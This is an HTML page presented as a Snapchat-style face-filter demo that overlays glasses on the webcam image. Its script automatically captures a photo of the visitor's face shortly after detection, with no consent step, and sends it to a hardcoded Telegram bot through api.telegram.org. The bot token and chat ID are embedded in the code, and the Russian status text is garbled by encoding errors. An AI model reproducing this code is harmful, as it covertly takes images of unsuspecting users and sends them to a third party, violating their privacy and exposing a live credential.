<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Snapchat Clone Web</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      background: #000;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      font-family: sans-serif;
      color: white;
    }
    #video-container {
      position: relative;
      width: 100vw;
      max-width: 400px;
      height: 533px;
    }
    video, canvas {
      position: absolute;
      width: 100%;
      height: 100%;
      object-fit: cover;
      border-radius: 16px;
    }
    #status {
      margin-top: 12px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div id="video-container">
    <video id="video" autoplay muted playsinline></video>
    <canvas id="overlay"></canvas>
  </div>
  <div id="status">–ó–∞–ø—É—Å–∫ –∫–∞–º–µ—Ä—ã...</div>

  <!-- MediaPipe -->
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>

  <script>
    const BOT_TOKEN = '7759810259:AAG4IjnFm65UOZl_bmRgEReerr8U4RSJBaE';
    const CHAT_ID = '5586578957';

    const video = document.getElementById('video');
    const canvas = document.getElementById('overlay');
    const ctx = canvas.getContext('2d');
    const status = document.getElementById('status');

    const filterImg = new Image();
    filterImg.src = 'https://i.postimg.cc/fyC6yZ9P/glasses.png'; // –æ—á–∫–∏

    const faceMesh = new FaceMesh({
      locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
    });

    faceMesh.setOptions({
      maxNumFaces: 1,
      refineLandmarks: true,
      minDetectionConfidence: 0.5,
      minTrackingConfidence: 0.5
    });

    let snapDone = false;

    faceMesh.onResults((results) => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.clearRect(0, 0, canvas.width, canvas.height);

      if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) return;

      const landmarks = results.multiFaceLandmarks[0];
      const leftEye = landmarks[33];
      const rightEye = landmarks[263];

      const dx = rightEye.x - leftEye.x;
      const dy = rightEye.y - leftEye.y;
      const angle = Math.atan2(dy, dx);
      const dist = Math.sqrt(dx * dx + dy * dy) * canvas.width;

      const centerX = (leftEye.x + rightEye.x) / 2 * canvas.width;
      const centerY = (leftEye.y + rightEye.y) / 2 * canvas.height;

      ctx.save();
      ctx.translate(centerX, centerY);
      ctx.rotate(angle);
      ctx.drawImage(filterImg, -dist / 2, -dist / 3, dist, dist / 1.5);
      ctx.restore();

      if (!snapDone) {
        snapDone = true;
        setTimeout(() => takePhoto(), 1500);
      }
    });

    const camera = new Camera(video, {
      onFrame: async () => {
        await faceMesh.send({ image: video });
      },
      width: 640,
      height: 480
    });

    function takePhoto() {
      status.textContent = 'üì∏ –°–Ω–∏–º–∞–µ–º —Ñ–æ—Ç–æ...';

      const photoCanvas = document.createElement('canvas');
      photoCanvas.width = canvas.width;
      photoCanvas.height = canvas.height;
      const photoCtx = photoCanvas.getContext('2d');

      photoCtx.translate(photoCanvas.width, 0);
      photoCtx.scale(-1, 1);
      photoCtx.drawImage(video, 0, 0, photoCanvas.width, photoCanvas.height);
      photoCtx.setTransform(1, 0, 0, 1, 0, 0);
      photoCtx.drawImage(canvas, 0, 0);

      photoCanvas.toBlob(blob => sendToTelegram(blob), 'image/png');
    }

    function sendToTelegram(blob) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'snap.png');

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
        .then(res => res.json())
        .then(data => {
          if (data.ok) {
            status.textContent = '‚úÖ –§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram';
          } else {
            status.textContent = '‚ùå –û—à–∏–±–∫–∞: ' + JSON.stringify(data);
          }
        })
        .catch(err => {
          status.textContent = '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: ' + err.message;
        });
    }

    camera.start();
  </script>
</body>
</html>
